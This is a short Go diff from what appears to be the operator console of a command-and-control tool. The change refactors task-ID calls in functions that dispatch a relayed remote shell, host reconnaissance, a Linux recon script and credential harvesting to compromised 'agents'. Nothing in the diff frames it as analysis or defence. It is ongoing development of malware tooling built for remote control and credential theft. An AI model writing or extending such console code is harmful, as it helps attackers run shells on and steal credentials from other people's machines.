@@ -824,7 +824,7 @@ func (c *Console) cmdShell(args []string) {
 	shellDone := make(chan error, 1)
 	go func() {
 		res, dispErr := agentDispatch(sess, proto.Task{
-			ID:    agentTaskID("sh", relayAddr),
+			ID:    agentTaskID("sh"),
 			Kind:  proto.TaskShell,
 			Relay: relayAddr,
 		}, 60*time.Minute)
@@ -1940,7 +1940,7 @@ func (c *Console) cmdReconAgent(sess *Session) {
 	fmt.Printf("[*] Running recon on agent %d...\n", sess.ID)
 
 	res, err := agentDispatch(sess, proto.Task{
-		ID:   agentTaskID("recon", ""),
+		ID:   agentTaskID("recon"),
 		Kind: proto.TaskRecon,
 	}, 60*time.Second)
 	if err != nil {
@@ -2047,7 +2047,7 @@ func (c *Console) cmdReconAgentLinux(sess *Session) {
 	sectionRe := buildSectionRe(nonce)
 
 	res, err := agentDispatch(sess, proto.Task{
-		ID:      agentTaskID("recon", "linux"),
+		ID:      agentTaskID("recon"),
 		Kind:    proto.TaskExec,
 		Command: script,
 	}, 3*time.Minute)
@@ -2088,7 +2088,7 @@ func (c *Console) cmdCredsAgent(sess *Session, outPath string) {
 	fmt.Printf("[*] Harvesting credentials from agent %d...\n", sess.ID)
 
 	res, err := agentDispatch(sess, proto.Task{
-		ID:   agentTaskID("creds", ""),
+		ID:   agentTaskID("creds"),
 		Kind: proto.TaskCreds,
 	}, 60*time.Second)
 	if err != nil {
